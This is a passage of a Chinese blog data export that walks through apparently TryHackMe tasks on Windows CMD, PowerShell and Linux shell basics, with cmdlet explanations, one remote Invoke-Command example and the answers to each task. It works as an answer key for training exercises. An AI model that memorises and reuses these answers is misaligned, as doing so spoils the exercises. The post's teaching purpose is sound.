src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task6.png\" alt=\"task6\"></p>\n<p>shutdown &#x2F;r：重启计算机。<br>shutdown &#x2F;a：取消正在进行的关机或重启操作。</p>\n<h2 id=\"windows-powershell\"><a href=\"#windows-powershell\" class=\"headerlink\" title=\"windows powershell\"></a>windows powershell</h2><p>接下来是powershell</p>\n<p>废话不多说 我们看看task2</p>\n<h3 id=\"task2-1\"><a href=\"#task2-1\" class=\"headerlink\" title=\"task2\"></a>task2</h3><p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task2.png\" alt=\"task2\"></p>\n<p>我们怎样称呼开发 PowerShell 所采用的高级方法？</p>\n<p>答案:<strong>object-oriented</strong>(面向对象)</p>\n<h3 id=\"task3-1\"><a href=\"#task3-1\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p><strong>powershell基础</strong></p>\n<h4 id=\"打开powershell\"><a href=\"#打开powershell\" class=\"headerlink\" title=\"打开powershell\"></a>打开powershell</h4><p>打开powershell有很多个方法</p>\n<p> 1.开始菜单：powershell在 Windows 开始菜单搜索栏中输入，然后在结果中单击Windows PowerShell或。PowerShell</p>\n<p>2 .运行对话框：按Win + R打开Run对话框，输入powershell，然后点击Enter。</p>\n<p> 3.文件资源管理器：导航到任何文件夹，然后powershell在地址栏中输入，然后按Enter。这将在该特定目录中打开PowerShell 。</p>\n<h4 id=\"cmdlet\"><a href=\"#cmdlet\" class=\"headerlink\" title=\"cmdlet\"></a>cmdlet</h4><p> PowerShell命令称为<strong>cmdlets</strong>。它们比传统的 Windows 命令功能更牛掰，并且允许进行更高级的数据操作。</p>\n<p> Cmdlet 遵循一致的<strong>Verb-Noun</strong>8命名约定</p>\n<p>eg：</p>\n<ul>\n<li><strong>Get-Content</strong>：检索（获取）文件的内容并将其显示在控制台中。</li>\n<li><strong>Set-Location</strong>：更改（设置）当前工作目录。</li>\n</ul>\n<p>假如说你想看看有哪些可用的cmdlet啥的 可以用<strong>get-command</strong>这个命令</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/get-command.png\" alt=\"getcommand\"></p>\n<p>还能在后面加个<strong>commandtype</strong>来筛选自己想要的东西</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/commandtype.png\" alt=\"getcommand\"></p>\n<p>当然不懂的话 我们就用<strong>get-help</strong> 这里用的是get-data。我们可以通过在基本语法中添加一些选项来检索有关 cmdlet 的其他有用信息。</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/help.png\" alt=\"help\"></p>\n<p>get-alias 列出了所有可用的别名<br><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/getalias.png\" alt=\"getalias\"></p>\n<p>我们看一下题目</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task3.png\" alt=\"task3\"></p>\n<p>第一题 如何检索remove开头命令？<br>用name筛选一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get-command -name remove*</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/remove.png\" alt=\"remove\"></p>\n<p>第二题 echo这个命令的别名叫啥?</p>\n<p>用<strong>get-command -name</strong> 筛选一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get-command -name echo</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/echo.png\" alt=\"echo\"></p>\n<p>用于检索New-LocalUser的cmdlet 的一些示例用法的命令是什么</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Get-Help New-LocalUser -examples</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/localuser.png\" alt=\"local\"></p>\n<h3 id=\"task4-1\"><a href=\"#task4-1\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p>文件系统</p>\n<p><strong>Get-ChildItem</strong>列出使用参数指定位置的文件和目录<strong>Path</strong>。它可用于探索目录并查看其内容。<br>如果未Path指定，则 cmdlet 将显示当前工作目录的内容。</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/getchilditem.png\" alt=\"get\"></p>\n<p>要导航到其他目录，我们可以使用<strong>Set-Location</strong>。它会更改当前目录，将我们带到指定路径，类似于cd命令提示符中的命令。</p>\n<p>要在PowerShell中创建一个项目，我们可以使用<strong>New-Item</strong>。</p>\n<p><strong>Remove-Itemcmdlet</strong> 会同时删除目录和文件</p>\n<p>我们可以分别使用<strong>Copy-Item</strong>（相当于copy）和<strong>Move-Item</strong>（相当于move）来复制或移动文件和目录。</p>\n<p>读取和显示文件的内容，我们可以使用 <strong>cmdlet Get-Content</strong>，其工作方式与type命令提示符</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task4.png\" alt=\"task4\"></p>\n<p>第一题 类似type的命令就是get-content</p>\n<p>第二题  Get-ChildItem -Path C:\\Users (Get-ChildItem之后要加个路径)</p>\n<p>第三题数一下就知道了 四个</p>\n<h3 id=\"task5-1\"><a href=\"#task5-1\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p>管道(|) 是命令行环境中使用的一种技术，允许将一个命令的输出用作另一个命令的输入。</p>\n<h4 id=\"where-object\"><a href=\"#where-object\" class=\"headerlink\" title=\"where-object\"></a>where-object</h4><p> 用于根据条件筛选对象。它会检查输入对象的属性，并根据指定的条件过滤出符合条件的对象。</p>\n<h5 id=\"运算符\"><a href=\"#运算符\" class=\"headerlink\" title=\"运算符\"></a>运算符</h5><p><strong>&gt;-eq</strong>（即“等于”）是与其他脚本语言（例如 Bash、Python）共享的一组比较运算符的一部分。</p>\n<p>-<strong>ne</strong>：“不等于”。此运算符可用于根据指定的条件从结果中排除对象。</p>\n<p><strong>-gt</strong>：“大于”。此运算符将仅过滤超过指定值的对象。需要注意的是，这是一个严格的比较，这意味着等于指定值的对象将被排除在结果之外。</p>\n<p><strong>-ge</strong>：“大于或等于-gt”。这是上一个运算符的非严格版本。与的组合-eq。</p>\n<p><strong>-lt</strong>：“小于”。与“大于”类似，这是一个严格运算符。它仅包含严格低于某个值的对象。</p>\n<p><strong>-le</strong>：“小于或等于”。与 类似，这是前一个运算符的非严格版本。和-ge的组合。-lt-eq</p>\n<p>你已经掌握知识点了 现在我们来做一道题</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task5.png\" alt=\"task5\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Get-ChildItem | Where-Object -Property Length -gt 100</span><br><span class=\"line\"></span><br><span class=\"line\">-Property Length:指定要检查的属性是 Length。对于文件对象,Length 属性表示文件的大小（以字节为单位）。</span><br><span class=\"line\"></span><br><span class=\"line\">-gt 100:-gt 是 “大于”的缩写，表示筛选出 Length 属性值大于 100 的对象。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"task6-1\"><a href=\"#task6-1\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p>系统与网络信息</p>\n<p><strong>Get-ComputerInfocmdlet</strong> 可检索全面的系统信息，包括操作系统信息、硬件规格、BIOS 详细信息等。</p>\n<p><strong>Get-LocalUser</strong>它列出了系统上的所有本地用户帐户。默认输出显示每个用户的用户名、帐户状态和说明。</p>\n<p><strong>Get-NetIPConfiguration</strong>提供有关系统上网络接口的详细信息，包括 IP 地址、DNS服务器和网关配置。</p>\n<p><strong>Get-NetIPAddresscmdlet</strong> 将显示系统上配置的所有 IP 地址的详细信息，包括当前不活动的 IP 地址。</p>\n<p>简单科普了一下 开始看看题目</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task6.png\" alt=\"task6\"></p>\n<p>第一题 我们直接输入<strong>get-localuser</strong> 一看就能看出多了一个用户p1r4t3</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/user.png\" alt=\"task6\"></p>\n<p>第二题也可以顺便解出来 因为用户旁边的就是说明 正是题目需要的<br>A merry life and a short one.</p>\n<p>第三题 其实也还好 一开始我以为要远程登录啥的 后来发现是我多虑了 </p>\n<p>直接cd ..退回上一级文件夹 <strong>childitem</strong>一下 就能看到p1r4t3 这个用户的文件夹 </p>\n<p>然后我们 <strong>set-location</strong> p1r4t3 进这个用户的文件夹 就能发现隐藏的宝藏 在进去就可以发现flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set-location Users</span><br><span class=\"line\"></span><br><span class=\"line\">set-location p1r4t3</span><br><span class=\"line\"></span><br><span class=\"line\">set-location hidden-treasure-chest</span><br><span class=\"line\"></span><br><span class=\"line\">get-content big-treasure.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/flag1.png\" alt=\"task6\"></p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/flag2.png\" alt=\"task6\"></p>\n<h3 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h3><p>实时系统分析</p>\n<p><strong>Get-Process</strong>提供所有当前正在运行的进程的详细视图，包括CPU和内存使用情况，使其成为监控和故障排除的强大工具。</p>\n<p><strong>Get-Service</strong>允许检索有关机器上服务状态的信息，例如哪些服务正在运行、停止或暂停。它被系统管理员广泛用于故障排除，也被取证分析师用于寻找系统上安装的异常服务</p>\n<p><strong>Get-NetTCPConnection</strong>请显示当前TCP连接，深入了解本地和远程端点。此 cmdlet 在事件响应或恶意软件分析任务期间特别有用，因为它可以发现隐藏的后门或与攻击者控制的服务器建立的连接。</p>\n<p><strong>Get-FileHash</strong>一个用于生成文件哈希的有用 cmdlet，它在事件响应、威胁搜寻和恶意软件分析中特别有价值，因为它有助于验证文件完整性并检测潜在的篡改。</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task7.png\" alt=\"task7\"></p>\n<p>第一题 我们在刚才的那个文件夹里输入Get-FileHash命令来看他的hash值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Get-FileHash big-treasure-txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/hash.png\" alt=\"task7\"></p>\n<p>第二题Get-NetTCPConnection 输出的信息中包含一个名为 OwningProcess 的属性，该属性表示每个 TCP 连接所属的进程 ID（PID）。</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/7.2.png\" alt=\"task7\"></p>\n<p>第三题 这一题就很有意思了 题目说是服务 那就要用<strong>get-service</strong><br>我们用| where-object 后面就填我们提示说的displayname 题目说了说明和displayname有关 我们用<strong>-like “<em>merry</em>“</strong>来找出指定的服务 (你也可以直接在后面复制整个说明)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get-service | where-object -like &quot;*merry*&quot; </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/7.3.png\" alt=\"task7\"></p>\n<h3 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h3><p>脚本<br><strong>Invoke-Command</strong>对于在远程系统上执行命令至关重要，因此它对于系统管理员、安全工程师和渗透测试人员来说至关重要。它Invoke-Command 可实现高效的远程管理，并结合脚本实现跨多台机器的任务自动化。它还可用于在渗透测试人员或攻击者的参与过程中在目标系统上执行有效载荷或命令。</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task8.png\" alt=\"task7\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Invoke-Command -ComputerName RoyalFortune -ScriptBlock &#123;Get-Service&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"linux-shell\"><a href=\"#linux-shell\" class=\"headerlink\" title=\"linux shell\"></a>linux shell</h2><p>总算来到比较熟悉的地方了 linux还是懂点的 废话不多说开始吧</p>\n<h4 id=\"task2-2\"><a href=\"#task2-2\" class=\"headerlink\" title=\"task2\"></a>task2</h4><p>要查看当前工作目录，可以执行<strong>pwd</strong>，它代表打印工作目录，<br>要查看目录的内容 可以用<strong>ls</strong>命令<br>读取文件的内容 用<strong>cat</strong>命令<br>grep 命令可以搜索文件内的任何单词或模式</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/task2.png\" alt=\"task2\"></p>\n<ul>\n<li>第一题 bash (echo $SHELL可以看你的linux shell当前版本)</li>\n<li>第二题 ls </li>\n<li>第三题 grep</li>\n</ul>\n<h3 id=\"task3-2\"><a href=\"#task3-2\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p>cat &#x2F;etc&#x2F;shell可以列出Linux 操作系统中可用的 shell</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/task3.png\" alt=\"task3\"></p>\n<ul>\n<li>第一题 fish</li>\n<li>第二题 bash</li>\n<li>第三题 history</li>\n</ul>\n<h3 id=\"task4-2\"><a href=\"#task4-2\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/task4.png\" alt=\"task3\"></p>\n<ul>\n<li>第一题 #!&#x2F;bin&#x2F;bash</li>\n<li>第二题 chmod +x</li>\n<li>第三题 loops</li>\n</ul>\n<h3 id=\"task5-2\"><a href=\"#task5-2\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/task5.png\" alt=\"task3\"></p>\n<p>在看文章的时候 文章说了pin是7385</p>\n<p>答案为7385</p>\n<h3 id=\"task6-2\"><a href=\"#task6-2\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/task6.png\" alt=\"task3\"></p>\n<p>我们来看题目要求 进入机子的&#x2F;home&#x2F;user的脚本里面 将三个空修改完</p>\n<p>第一个空是填文件的路径 &#x2F;var&#x2F;log</p>\n<p>第二个空是把文章里面的flag填进去</p>\n<p>第三个空要填$directory （$directory&#x2F;*.log 是一个模式匹配表达式，表示 &#x2F;var&#x2F;log 目录下所有以 .log 结尾的文件。）</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/cat.png\" alt=\"task3\"></p>\n<p>将脚本改完之后 我们开始运行脚本 脚本告诉我们 flag在authentication.log里面</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/cat1.png\" alt=\"task3\"></p>\n<p>我们用cat搜索一下authentication.log里的关键词 成功搜索到</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/cat2.png\" alt=\"task3\"></p>\n<p>OK 传说的三位 我们已经介绍完毕 还有很多内容要我们学习 这些只是个皮面 keep moving</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cm74njvx60001tsg6183fgsbs","tag_id":"cm74njvxa0004tsg615x316s1","_id":"cm74njvxe000ctsg6ay8j1akh"},{"post_id":"cm74njvx90003tsg6dop16epm","tag_id":"cm74njvxd000btsg66p6r31wv","_id":"cm74njvxg000ktsg66y0bh0u9"},{"post_id":"cm74njvxb0006tsg6fs1ber5c","tag_id":"cm74njvxf000htsg65ef5h7iv","_id":"cm74njvxi000qtsg66el4fa19"},{"post_id":"cm74njvxg000mtsg6ea933niu","tag_id":"cm74njvxa0004tsg615x316s1","_id":"cm74njvxi000ttsg658hlcis7"},{"post_id":"cm74njvxc0008tsg69b5i4jwd","tag_id":"cm74njvxf000htsg65ef5h7iv","_id":"cm74njvxj000xtsg6aj10cy60"},{"post_id":"cm74njvxe000etsg6b0n492gj","tag_id":"cm74njvxi000utsg669ax1y6b","_id":"cm74njvxk0013tsg61v6y96vv"},{"post_id":"cm74njvxf000gtsg62av8f4vd","tag_id":"cm74njvxk0010tsg658su5it8","_id":"cm74njvxl0016tsg6bi45f6gg"},{"post_id":"cm74njvxf000jtsg624p67s4h","tag_id":"cm74njvxl0015tsg6hyh9em8m","_id":"cm74njvxl0018tsg64pe9hwcw"},{"post_id":"cm74njvxh000ptsg64dux5gqf","tag_id":"cm74njvxl0017tsg63d4x1i8b","_id":"cm74njvxl001atsg6dt78gy9v"},{"post_id":"cm74njvxi000stsg69uc43mct","tag_id":"cm74njvxl0019tsg660zqgxmy","_id":"cm74njvxm001ctsg62dos6ybp"},{"post_id":"cm74njvxj000wtsg61j9sgvpa","tag_id":"cm74njvxl001btsg6aldpcolk","_id":"cm74njvxm001etsg6094edrh9"},{"post_id":"cm74njvxj000ztsg6b0dv458j","tag_id":"cm74njvxm001dtsg67iecfuz6","_id":"cm74njvxm001gtsg65u3cfz21"},{"post_id":"cm74njvxk0012tsg6ccloejnv","tag_id":"cm74njvxm001ftsg6ag5ub7vx","_id":"cm74njvxm001htsg648ii9ao3"},{"post_id":"cm74njvxo001jtsg69hwg3sjq","tag_id":"cm74njvxo001ltsg69j0aaxmz","_id":"cm74njvxp001otsg6ath7f2yd"},{"post_id":"cm74njvxo001mtsg691mzbbzr","tag_id":"cm74njvxp001ntsg65kd9d5a7","_id":"cm74njvxp001ptsg662j96370"}],"Tag":[{"name":"linux 渗透","_id":"cm74njvxa0004tsg615x316s1"},{"name":"Windows 用户与组 管理","_id":"cm74njvxd000btsg66p6r31wv"},{"name":"linux 安全 管理","_id":"cm74njvxf000htsg65ef5h7iv"},{"name":"windows 基础","_id":"cm74njvxi000utsg669ax1y6b"},{"name":"web 网络","_id":"cm74njvxk0010tsg658su5it8"},{"name":"ctf linux 密码破解","_id":"cm74njvxl0015tsg6hyh9em8m"},{"name":"wireshark 基础 渗透工具","_id":"cm74njvxl0017tsg63d4x1i8b"},{"name":"密码学","_id":"cm74njvxl0019tsg660zqgxmy"},{"name":"linux nmap","_id":"cm74njvxl001btsg6aldpcolk"},{"name":"oaasp 漏洞 tryhackme","_id":"cm74njvxm001dtsg67iecfuz6"},{"name":"信息搜集 入门","_id":"cm74njvxm001ftsg6ag5ub7vx"},{"name":"linux","_id":"cm74njvxo001ltsg69j0aaxmz"},{"name":"linux windows shell 管理","_id":"cm74njvxp001ntsg65kd9d5a7"}]}}